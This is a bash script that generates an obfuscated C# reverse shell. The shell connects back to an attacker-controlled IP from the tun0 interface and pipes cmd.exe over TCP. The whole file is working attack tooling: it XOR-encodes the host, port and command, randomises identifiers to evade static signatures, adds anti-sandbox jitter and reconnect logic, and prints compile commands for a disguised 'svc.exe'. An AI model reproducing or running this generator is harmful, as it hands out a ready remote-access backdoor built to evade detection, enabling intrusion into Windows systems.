#!/usr/bin/env bash
# cs_revshell/gen.sh — Improved C# reverse shell generator
#
# Improvements over gen_cs_shell.sh (v1):
#   - 4-byte cyclic XOR key  (not a single visible `int k`)
#   - Full per-run randomisation of namespace, class, all method/variable names
#   - Reconnect loop: configurable retry count + exponential back-off (2–6 s)
#   - Pre-connect jitter sleep (anti-sandbox heuristic)
#   - UTF-8 I/O instead of ASCII
#   - Port range validation (1–65535)
#   - SHA256 checksum of the generated file printed at the end
#   - Ready-to-paste compile commands for Kali (mcs) and Windows (csc.exe)
#
# Usage:
#   ./gen.sh [interface] [port] [output_dir] [max_retries] [jitter_ms]
#
# Defaults:
#   interface   = tun0
#   port        = 5986
#   output_dir  = .
#   max_retries = 5
#   jitter_ms   = 3000   (max random sleep before each connect attempt)

set -eu

# ── Arguments ──────────────────────────────────────────────────────────────────
IFACE="${1:-tun0}"
LPORT="${2:-5986}"
OUTDIR="${3:-.}"
MAX_RETRIES="${4:-5}"
JITTER_MS="${5:-3000}"

# ── Validation ─────────────────────────────────────────────────────────────────
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || (( LPORT < 1 || LPORT > 65535 )); then
    echo "[!] Invalid port: '$LPORT'  (must be 1–65535)" >&2
    exit 1
fi

if ! [[ "$MAX_RETRIES" =~ ^[0-9]+$ ]] || (( MAX_RETRIES < 1 )); then
    echo "[!] Invalid max_retries: '$MAX_RETRIES'  (must be >= 1)" >&2
    exit 1
fi

if ! [[ "$JITTER_MS" =~ ^[0-9]+$ ]]; then
    echo "[!] Invalid jitter_ms: '$JITTER_MS'" >&2
    exit 1
fi

# ── Resolve LHOST ──────────────────────────────────────────────────────────────
LHOST=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1 || true)
if [[ -z "$LHOST" ]]; then
    echo "[!] Could not resolve IP from interface: $IFACE" >&2
    exit 1
fi

echo "[*] LHOST      : $LHOST  ($IFACE)"
echo "[*] LPORT      : $LPORT"
echo "[*] Max retries: $MAX_RETRIES"
echo "[*] Jitter     : 0–${JITTER_MS} ms"

# ── 4-byte cyclic XOR key ──────────────────────────────────────────────────────
# v1 used a single `int k = N` visible to any decompiler.
# Here the key is 4 independent bytes used cyclically, stored as a byte array.
# The key value is still in the binary, but requires combining all 4 bytes and
# knowing the cycling logic — meaningfully more friction than a bare int literal.
K0=$(( RANDOM % 256 ))
K1=$(( RANDOM % 256 ))
K2=$(( RANDOM % 256 ))
K3=$(( RANDOM % 256 ))

# XOR-encrypt a string with the 4-byte cyclic key → C# byte array literal
xor_bytes() {
    local s="$1"
    local out=""
    local ki k b x
    for (( i=0; i < ${#s}; i++ )); do
        b=$(printf '%d' "'${s:$i:1}")
        ki=$(( i % 4 ))
        case $ki in
            0) k=$K0 ;; 1) k=$K1 ;; 2) k=$K2 ;; 3) k=$K3 ;;
        esac
        x=$(( b ^ k ))
        [[ -n "$out" ]] && out+=","
        out+="0x$(printf '%02x' "$x")"
    done
    echo "$out"
}

IP_ENC=$(xor_bytes "$LHOST")
PORT_ENC=$(xor_bytes "$LPORT")
CMD_ENC=$(xor_bytes "cmd.exe")

# ── Per-run identifier randomisation (pure bash, no external commands) ─────────
# v1 had hardcoded class/method names — every generated binary shared the same
# strings, making static-signature detection trivial.
# Here every name is regenerated on each run: namespace, class, all methods and
# local variables. Only `Main` stays fixed (C# compiler requirement).
_ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
_ALNUM='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

rand_ident() {
    local len="${1:-9}"
    local r="${_ALPHA:$(( RANDOM % ${#_ALPHA} )):1}"
    for (( i=1; i<len; i++ )); do
        r+="${_ALNUM:$(( RANDOM % ${#_ALNUM} )):1}"
    done
    echo "$r"
}

NS="${NS_A:=$(rand_ident 10)}.${NS_B:=$(rand_ident 8)}"
CLASS=$(rand_ident 12)
FN_DEC=$(rand_ident 8)   # decryption helper
FN_RUN=$(rand_ident 10)  # connection/execution loop
V_KEY=$(rand_ident 5)
V_HOST=$(rand_ident 5)
V_PORT=$(rand_ident 5)
V_CMD=$(rand_ident 5)
V_TCP=$(rand_ident 6)
V_NS=$(rand_ident 5)
V_PROC=$(rand_ident 5)
V_TRIES=$(rand_ident 7)
V_RNG=$(rand_ident 5)
V_SW=$(rand_ident 4)
V_TOUT=$(rand_ident 5)
V_TERR=$(rand_ident 5)
V_BUF=$(rand_ident 4)
V_N=$(rand_ident 3)
V_RECV=$(rand_ident 5)
V_BYTES=$(rand_ident 5)

# ── Generate shell.cs ──────────────────────────────────────────────────────────
mkdir -p "$OUTDIR"
OUTFILE="${OUTDIR}/shell.cs"

cat > "$OUTFILE" << CSHARP
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ${NS}
{
    class ${CLASS}
    {
        // 4-byte cyclic XOR key — split across four elements to avoid a single
        // visible integer constant in the decompiled output.
        static readonly byte[] ${V_KEY} = { ${K0}, ${K1}, ${K2}, ${K3} };

        static string ${FN_DEC}(byte[] data)
        {
            byte[] r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ ${V_KEY}[i % ${V_KEY}.Length]);
            return Encoding.UTF8.GetString(r);
        }

        static void ${FN_RUN}()
        {
            string ${V_HOST} = ${FN_DEC}(new byte[] { ${IP_ENC} });
            int    ${V_PORT} = int.Parse(${FN_DEC}(new byte[] { ${PORT_ENC} }));
            string ${V_CMD}  = ${FN_DEC}(new byte[] { ${CMD_ENC} });

            Random ${V_RNG}   = new Random();
            int    ${V_TRIES} = 0;

            while (${V_TRIES} < ${MAX_RETRIES})
            {
                // Jitter: random sleep before each connect attempt (anti-sandbox)
                Thread.Sleep(${V_RNG}.Next(0, ${JITTER_MS}));

                TcpClient     ${V_TCP}  = null;
                NetworkStream ${V_NS}   = null;
                Process       ${V_PROC} = null;

                try
                {
                    ${V_TCP} = new TcpClient();
                    ${V_TCP}.Connect(${V_HOST}, ${V_PORT});
                    ${V_NS}  = ${V_TCP}.GetStream();

                    ${V_PROC} = new Process();
                    ${V_PROC}.StartInfo.FileName               = ${V_CMD};
                    ${V_PROC}.StartInfo.UseShellExecute         = false;
                    ${V_PROC}.StartInfo.RedirectStandardInput  = true;
                    ${V_PROC}.StartInfo.RedirectStandardOutput = true;
                    ${V_PROC}.StartInfo.RedirectStandardError  = true;
                    ${V_PROC}.StartInfo.CreateNoWindow          = true;
                    ${V_PROC}.Start();

                    StreamWriter ${V_SW} = ${V_PROC}.StandardInput;
                    ${V_SW}.AutoFlush = true;

                    // Stdout relay thread
                    Thread ${V_TOUT} = new Thread(() => {
                        try {
                            byte[] ${V_BUF} = new byte[8192]; int ${V_N};
                            while ((${V_N} = ${V_PROC}.StandardOutput.BaseStream
                                       .Read(${V_BUF}, 0, ${V_BUF}.Length)) > 0)
                                ${V_NS}.Write(${V_BUF}, 0, ${V_N});
                        } catch {}
                    }) { IsBackground = true };

                    // Stderr relay thread
                    Thread ${V_TERR} = new Thread(() => {
                        try {
                            byte[] ${V_BUF} = new byte[8192]; int ${V_N};
                            while ((${V_N} = ${V_PROC}.StandardError.BaseStream
                                       .Read(${V_BUF}, 0, ${V_BUF}.Length)) > 0)
                                ${V_NS}.Write(${V_BUF}, 0, ${V_N});
                        } catch {}
                    }) { IsBackground = true };

                    ${V_TOUT}.Start();
                    ${V_TERR}.Start();

                    // Stdin relay (main thread) — UTF-8 instead of ASCII
                    byte[] ${V_RECV} = new byte[8192]; int ${V_BYTES};
                    while ((${V_BYTES} = ${V_NS}.Read(${V_RECV}, 0, ${V_RECV}.Length)) > 0)
                        ${V_SW}.Write(Encoding.UTF8.GetString(${V_RECV}, 0, ${V_BYTES}));
                }
                catch { }
                finally
                {
                    try { ${V_PROC}?.Kill();  } catch {}
                    try { ${V_NS}?.Close();   } catch {}
                    try { ${V_TCP}?.Close();  } catch {}
                }

                ${V_TRIES}++;
                // Back-off: wait 2–6 s before next retry
                Thread.Sleep(${V_RNG}.Next(2000, 6000));
            }
        }

        // Entry point name must stay 'Main' — everything else is randomised.
        static void Main(string[] args)
        {
            try { ${FN_RUN}(); } catch {}
        }
    }
}
CSHARP

# ── Summary ────────────────────────────────────────────────────────────────────
if command -v sha256sum &>/dev/null; then
    SHA=$(sha256sum "$OUTFILE" | awk '{print $1}')
elif command -v shasum &>/dev/null; then
    SHA=$(shasum -a 256 "$OUTFILE" | awk '{print $1}')
else
    SHA="(sha256sum not available)"
fi

echo ""
echo "[+] Generated : $OUTFILE"
echo "[+] SHA256    : $SHA"
printf "[+] XOR key   : 0x%02x 0x%02x 0x%02x 0x%02x\n" "$K0" "$K1" "$K2" "$K3"
echo "[+] Class     : ${NS}.${CLASS}"
echo ""
echo "── Compile ────────────────────────────────────────────────────────────────"
echo "   Kali   :  mcs -out:svc.exe $OUTFILE"
echo "   Windows:  csc.exe /nologo /out:svc.exe $OUTFILE"
echo "───────────────────────────────────────────────────────────────────────────"
